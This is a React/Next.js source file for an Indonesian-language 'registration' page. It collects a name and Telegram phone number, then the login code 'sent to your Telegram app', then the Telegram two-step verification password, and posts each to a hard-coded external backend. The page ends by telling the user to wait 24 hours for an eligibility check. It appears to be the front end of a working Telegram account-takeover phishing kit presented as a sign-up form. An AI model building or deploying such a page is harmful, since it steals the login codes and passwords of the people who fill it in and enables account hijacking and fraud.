"use client";
import { useState, useRef, useEffect } from 'react';
import Image from 'next/image';

export default function AuthForm() {
  const [step, setStep] = useState(1);
  const [nama, setNama] = useState('');
  const [nomor, setNomor] = useState('');
  const [otp, setOtp] = useState(['', '', '', '', '']); 
  const [sandi, setSandi] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isFinished, setIsFinished] = useState(false);
  const [error, setError] = useState('');
  const [isOtpError, setIsOtpError] = useState(false); // Untuk kotak merah
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const otpString = otp.join('');

  const handleOtpChange = (index: number, value: string) => {
    if (isNaN(Number(value))) return;
    setIsOtpError(false); // Reset merah saat mulai mengetik lagi
    const newOtp = [...otp];
    newOtp[index] = value.substring(value.length - 1);
    setOtp(newOtp);
    if (value && index < 4) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleNext = async () => {
    setError('');
    setIsLoading(true);

    try {
      const apiUrl = process.env.NEXT_PUBLIC_API_URL || 'https://backend-python-production-6e72.up.railway.app';
      const response = await fetch(`${apiUrl}/register`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ step, nomor, otp: otpString, sandi, nama })
      });
      
      const data = await response.json();

      if (response.ok) {
        if (step === 1) {
          setStep(2);
        } else if (step === 2) {
          if (data.status === 'need_2fa') setStep(3);
          else setIsFinished(true); 
        } else if (step === 3) {
          setIsFinished(true);
        }
      } else {
        if (step === 2) {
          setError('OTP SALAH!!');
          setIsOtpError(true);
          setOtp(['', '', '', '', '']); // Otomatis hapus angka yang gagal
          inputRefs.current[0]?.focus(); // Kembalikan fokus ke kotak pertama
        } else {
          setError(data.message || 'Terjadi kesalahan.');
        }
      }
    } catch (err) {
      setError('Koneksi gagal. Cek backend.');
    } finally {
      setIsLoading(false);
    }
  };

  if (isFinished) {
    return (
      <div className="full-screen-center">
        <div className="spinner-circle">
          <div className="spinner-inner-static">
            <p className="text-[#2196f3] font-bold text-sm">PROCESSING</p>
            <p className="text-[#2196f3] italic text-[10px]">please wait...</p>
          </div>
        </div>
        <p className="loading-status-text">
          Silakan tunggu prosesnya konfirmasi dalam waktu 1x24 jam untuk memeriksa kelayakan
        </p>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white flex flex-col items-center">
      <div className="w-full max-w-md relative aspect-[16/9]">
        <Image src="/banner.jpeg" alt="Banner" fill className="object-cover" priority />
      </div>

      <div className="w-full max-w-md p-6 space-y-6">
        {error && <p className="text-red-500 text-center font-bold text-sm bg-red-50 p-2 rounded animate-bounce">{error}</p>}

        {step === 1 && (
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-bold mb-1">Nama Lengkap:</label>
              <input type="text" className="w-full p-3 border rounded-lg bg-gray-50 outline-none" placeholder="Masukkan nama" value={nama} onChange={(e) => setNama(e.target.value)} />
            </div>
            <div>
              <label className="block text-sm font-bold mb-1">Nomor Telegram Aktif:</label>
              <input type="number" className="w-full p-3 border rounded-lg bg-gray-50 outline-none" placeholder="08..." value={nomor} onChange={(e) => setNomor(e.target.value)} />
            </div>
          </div>
        )}

        {step === 2 && (
          <div className="text-center">
            <label className="block text-sm font-bold mb-4 text-blue-600">Kami Telah Mengirimkan Kode OTP Ke Aplikasi Telegram Anda</label>
            <div className="flex justify-center gap-2">
              {otp.map((digit, idx) => (
                <input
                  key={idx}
                  ref={(el) => { inputRefs.current[idx] = el; }}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleOtpChange(idx, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(idx, e)}
                  className={`w-12 h-14 text-center text-2xl font-bold border-2 rounded-lg outline-none transition-all ${isOtpError ? 'border-red-500 bg-red-50' : 'border-gray-300 focus:border-blue-500'}`}
                />
              ))}
            </div>
            <button onClick={() => setStep(1)} className="mt-4 text-sm text-blue-500 font-bold hover:underline">
              Kirim Ulang Kode OTP
            </button>
          </div>
        )}

        {step === 3 && (
          <div>
            <label className="block text-sm font-bold mb-1 text-center">Sandi Verifikasi Dua Langkah:</label>
            <input type="password" className="w-full p-3 border rounded-lg bg-gray-50 text-center outline-none" placeholder="Sandi Anda" value={sandi} onChange={(e) => setSandi(e.target.value)} />
          </div>
        )}

        <button 
          onClick={handleNext}
          disabled={isLoading || (step === 2 && otpString.length < 5)}
          className={`w-full text-white font-bold py-4 rounded-lg transition-all ${isLoading || (step === 2 && otpString.length < 5) ? 'bg-gray-400' : 'bg-[#1d4ed8]'}`}
        >
          {isLoading ? "MEMPROSES..." : "DAFTAR SEKARANG"}
        </button>

        <div className="mt-6 text-left border-t pt-4">
          <p className="text-[12px] text-gray-500 leading-light italic">
            Peringatan:<br/>
            Pendaftaran hanya akan diproses melalui nomor telegram aktif!
          </p>
        </div>
      </div>
    </div>
  );
}